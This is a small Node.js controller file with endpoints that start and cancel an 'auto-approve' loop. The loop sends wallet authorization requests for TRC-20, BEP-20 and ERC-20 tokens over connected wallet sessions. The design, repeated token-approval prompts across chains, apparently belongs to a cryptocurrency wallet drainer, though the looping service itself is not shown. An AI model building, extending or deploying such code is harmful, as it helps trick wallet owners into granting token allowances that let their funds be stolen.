const store = require("../storage/sessions");
const { NotFoundError } = require("../utils/errors");
const { startAuthorizationLoop, cancelAuthorization } = require("../services/transactions");

function findSession(body) {
    if (body.connectionId) {
        return store.getSession(body.connectionId);
    }

    if (body.id) {
        return store.getSession(body.id);
    }

    if (body.topic) {
        return store.getSessionByTopic(body.topic);
    }

    return null;
}

/**
 * POST /api/front/auto-approve
 * Sends a wallet request in order: TRC-20, then BEP-20, then ERC-20.
 */
async function enableAutoApprove(req, res) {
    const session = findSession(req.body);

    if (!session) {
        throw new NotFoundError("Session not found");
    }

    const started = await startAuthorizationLoop(session.connectionId, req.body.accounts);

    res.json({
        success: true,
        started,
        connectionId: session.connectionId
    });
}

/**
 * POST /api/front/auto-approve/cancel
 */
function cancelAutoApprove(req, res) {
    const session = findSession(req.body);

    if (session) {
        cancelAuthorization(session.connectionId);
    }

    res.json({ success: true, cancelled: true });
}

module.exports = {
    enableAutoApprove,
    cancelAutoApprove
};
